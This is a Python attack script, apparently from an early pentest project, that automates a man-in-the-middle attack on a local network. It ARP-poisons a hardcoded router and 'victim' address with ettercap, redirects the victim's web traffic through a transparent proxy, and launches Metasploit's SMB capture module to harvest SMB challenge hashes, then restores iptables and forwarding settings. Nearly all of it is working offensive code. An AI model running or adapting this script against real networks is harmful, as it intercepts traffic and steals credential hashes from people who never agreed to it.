#!/usr/bin/python
# -*- coding: utf-8 -*-
'''
A hacked together example starting up a MITM
attack that evokes and captures SMB challenge
hashes.
'''

import os
import sys
import subprocess
import logging
import threading



from twisted.web import http
from twisted.internet import reactor

import ip_utils
from sergio_proxy import transparent_proxy

from UserMITM import UserMITM

__author__ = "Ben Schmidt"
__copyright__ = "Copyright 2010, Ben Schmidt"
__credits__ = ["Ben Schmidt"]
__license__ = "GPL v3"
__version__ = "0.1"
__maintainer__ = "Ben Schmidt"
__email__ = "supernothing@spareclockcycles.org"
__status__ = "alpha"

class ProxyThread(threading.Thread):
    def __init__(self,tip):
        self.tip = tip
        threading.Thread.__init__(self)
    def run(self):
        transparent_proxy.mitm = UserMITM(self.tip)
        f = http.HTTPFactory()
        f.protocol = transparent_proxy.TransparentProxy
        reactor.listenTCP(8080,f)
        reactor.run(installSignalHandlers=0)

msfc_loc = "/pentest/exploits/framework3/msfconsole"
etter_loc = "/usr/sbin/ettercap"
logbase = "test"
log_level = logging.DEBUG

#Local machine
local_ip = "192.168.2.109"

#Router
target1 = "192.168.2.1"

#Victim
target2 = "192.168.2.112"

#Prompt for variables not set explicitly
while not os.path.isfile(msfc_loc):
    if os.path.isdir(msfc_loc) and os.path.isfile(os.path.join(msfc_loc,"msfconsole")):
            msfc_loc = os.path.join(msfc_loc,"msfconsole")
            break
    msfc_loc = raw_input("Please input full path to msfconsole: ")

while not os.path.isfile("/usr/sbin/ettercap"):
    if os.path.isdir(etter_loc) and os.path.isfile(os.path.join(etter_loc,"ettercap")):
            etter_loc = os.path.isfile(os.path.join(etter_loc,"ettercap"))
            break
    etter_loc = raw_input("Please input full path to ettercap: ")

while not ip_utils.is_ip(local_ip):
    local_ip = raw_input("Please enter the network IP of the local machine: ")

while not ip_utils.is_ip(target1):
    target1 = raw_input("Please enter the network IP of the local router: ")

while not ip_utils.is_ip(target2):
    target2 = raw_input("Please enter the network IP of the victim machine: ")

 

#set up out commands
ipfwd_enable = "sudo sysctl -w net.ipv4.ip_forward=1"
ipfwd_disable = "sudo sysctl -w net.ipv4.ip_forward=%s" #modified later

iptbl_enable = "sudo iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 80 -j REDIRECT --to-port 8080" 
iptbl_disable = "sudo iptables --flush"

iptbl_bak = "iptables-save > /tmp/iptbl.bak"
iptbl_restore = "sudo iptables-restore < /tmp/iptbl.bak"

proxy_start = "python start_proxy.py"

msf_start = "sudo %s -r /tmp/msfconfig" % (msfc_loc)

ettr_start = "sudo %s -T -o -M arp /%s/ /%s/" % (etter_loc,target1,target2)

if __name__=="__main__":
    logger = logging.getLogger("")
    logger.setLevel(log_level)
    handler = logging.StreamHandler()
    logger.addHandler(handler)


    #check ip_forwarding state. enable forwarding
    logger.info("Enabling IP forwarding...")
    ip_forward_status = open("/proc/sys/net/ipv4/ip_forward","r").readline().replace("\n","")
    logger.debug("Saving current value of /proc/sys/net/ipv4/ip_forward : %s" % (ip_forward_status))
    logger.debug("Executing sysctl: %s" % ipfwd_enable)
    if os.system(ipfwd_enable) != 0:
        logger.error("Enabling IP forwarding failed. Exiting.")
        sys.exit(1)
    logger.info("IP Forwarding enabled successfully.")

    #could also be modified in future to also forward to dsniff for pw sniffing
    logger.info("Mapping port 80 to 8080...")
    logger.info("Saving current iptables settings to /tmp/iptbl.bak")
    logger.debug("Executing iptables-save: %s" % iptbl_bak)
    os.system(iptbl_bak)
    logger.debug("Executing iptables: %s" % iptbl_enable)
    if os.system(iptbl_enable) != 0:
        logger.error("Routing configuration failed. Make sure your distro uses iptables and that you have the proper priveleges to change them. Exiting...")
        sys.exit(1)
    logger.info("Portmapping completed successfully.")

    #start HTTP proxy
    logger.info("Starting HTTP proxy on port 8080...")
    proxy = ProxyThread(target2)
    proxy.start()

    #start ettercap
    logger.info("Starting MITM attack...press CTRL-C to quit.")
    logger.debug("Running ettercap: %s" % ettr_start)
    etter_proc = subprocess.Popen(ettr_start,shell=True,stdin=subprocess.PIPE)
    logger.info("MITM attack started.")

    #start msf
    logger.debug("Writing Metasploit config to /tmp/msfconfig")
    msf = open("/tmp/msfconfig","w")
    msf.write("use auxiliary/server/capture/smb\n")
    msf.write("set SRVHOST %s\n" % (local_ip))
    msf.write("set LOGFILE %s\n" % (logbase+".smb.log"))
    msf.close()
    logger.info("Starting Metasploit with selected modules...")
    logger.debug("Starting Metasploit console: %s" % msf_start)
    os.system(msf_start)
    logger.info("Metasploit execution finished, cleaning up...")
    
    #clean up everything we did
    logger.info("Stopping MITM attack...")
    etter_proc.kill()
    logger.info("MITM attack stopped.")

    logger.info("Stopping HTTP proxy...")
    reactor.stop()
    proxy.join()
    logger.info("HTTP Proxy stopped.")

    logger.info("Restoring IP forwarding...")
    logger.debug("Executing sysctl: %s" % (ipfwd_disable % ip_forward_status))
    os.system(ipfwd_disable % ip_forward_status)
    logger.info("IP forward settings restored.")

    logger.info("Restoring original iptables rules...")
    logger.info("Restoring iptables settings from /tmp/iptbl.bak")
    logger.debug("Executing iptables-restore: %s" % iptbl_restore)
    os.system(iptbl_restore)

    logger.info("Cleaning up after ourselves...")
    os.system("rm /tmp/msfconfig")
    logger.info("Temporary files deleted.")

    logger.info("Attack finished.")
